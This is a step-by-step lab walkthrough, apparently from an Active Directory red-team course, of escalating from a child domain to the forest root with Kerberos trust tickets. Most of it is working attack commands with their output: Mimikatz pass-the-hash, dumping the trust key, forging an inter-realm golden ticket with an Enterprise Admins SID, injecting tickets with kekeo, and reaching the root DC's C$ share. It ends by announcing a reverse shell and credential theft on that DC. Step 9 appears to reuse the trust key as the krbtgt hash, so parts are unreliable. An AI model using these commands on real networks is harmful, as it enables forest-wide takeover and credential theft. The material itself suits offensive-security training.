# Across Domains Implicit Two-Way Trust Relationship

### Across Forests
A trust relationship needs to be established.

### Child to Forest Root
Domains in the same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of the same forest:
- Krbtgt hash
- Trust tickets

### Kerberos Authentication Process
1. Steps 1 to 3 are common.
2. Step 4: The domain controller (DC) checks the global catalog and finds out this service is not in its domain but in the parent domain. So the DC responds with an inter-realm TGT. Our machine receives the inter-realm TGT (signed and encrypted with the trust key) also called a referrer ticket.
3. Step 5: This inter-realm TGS is presented to the DC of the parent domain. The only validation the parent DC does in this case is if it can decrypt the inter-realm TGT using the trust key.
4. Step 6: The DC decrypts the inter-realm TGS.
5. Step 7: The DC responds with a TGS which the client presents to the application server, which then decides on privileges.

## Privilege Escalation - Child to Parent using Trust Tickets
### Step-by-Step Instructions
1. Once the domain admin is compromised, switch to the domain admin:
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

2. Look for the cross forest or forest root trust key for privilege escalation. Retrieve the trust key for the trust between dollarcorp and moneycorp using mimikatz:
```powershell
PS C:\Windows\system32> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```

3. Find the trust key:
```powershell
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * aes256_hmac       6520498fb98b6bf3c59b13d188b77227ae3200aa05cdad783a97500165128583
    * aes128_hmac       e65aef4c7c0d83964f6dc62560ab1aa6
    * rc4_hmac_nt       3cbaa731b987e575822f00ddd6701a7b
```

4. Create the inter-realm TGT:
```powershell
PS C:\AD\Tools\kekeo_old> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:3cbaa731b987e575822f00ddd6701a7b /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
```
![image](https://github.com/user-attachments/assets/0e24cd36-c72d-419e-977e-3d5e195c70b5)

5. Request to create a TGS ticket for a service (CIFS) in the parent domain (moneycorp.local):
```powershell
PS C:\AD\Tools\kekeo_old> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

6. Present the TGS to the target service:
```powershell
PS C:\AD\Tools\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
```

7. Use the TGS to access the targeted service (you may need to use it twice). For example:
```powershell
PS C:\AD\Tools\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
Destination : Microsoft LSA API (multiple)
 < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

8. Try to access the target service to confirm privilege escalation:
```powershell
PS C:\AD\Tools\kekeo_old> klist
PS C:\ad\tools\kekeo_old> ls \\mcorp-dc.moneycorp.local\c$
```
![image](https://github.com/user-attachments/assets/ae250f47-f78f-4a7b-8b78-d38600527eeb)

9. Gather the krbtgt hash, and request an inter-realm tgt once again:
```powershell
PS C:\AD\Tools> Invoke-Mimikatz -Command '""Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:3cbaa731b987e575822f00ddd6701a7b /ticket:C:\AD\Tools\krbtgt_tkt.kirbi""'
```

10. Inject the ticket using mimikatz:
```powershell
PS C:\AD\Tools> Invoke-Mimikatz -Command '""Kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi""'
mimikatz(powershell) # kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi
```

11. Verify the TGT:
```powershell
PS C:\AD\Tools> klist
```
```
Current LogonId is 0:0xdac101e2

Cached Tickets: (1)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: krbtgt/dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local   --> krbtgt has done
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 7/15/2020 0:11:34 (local)
        End Time:   7/13/2030 0:11:34 (local)
        Renew Time: 7/13/2030 0:11:34 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

PS C:\AD\Tools>
```

12. Extract credentials of the Enterprise Administrator for use in DC-Shadow and schedule a task on the forest root DC to execute a reverse shell:
```powershell
PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local

System Directory : C:\Windows\system32 
Organization    :
Build Number     : 14393
Registered User  : Windows User
Serial Number    : 00377-80000-00000-AA549
Version         : 10.0.14393
```
Let’s extract credential of the Enterprise Administrator which can be used later for DC-Shadow. We will schedule a task on the forest root DC and execute a reverse shell on it.	
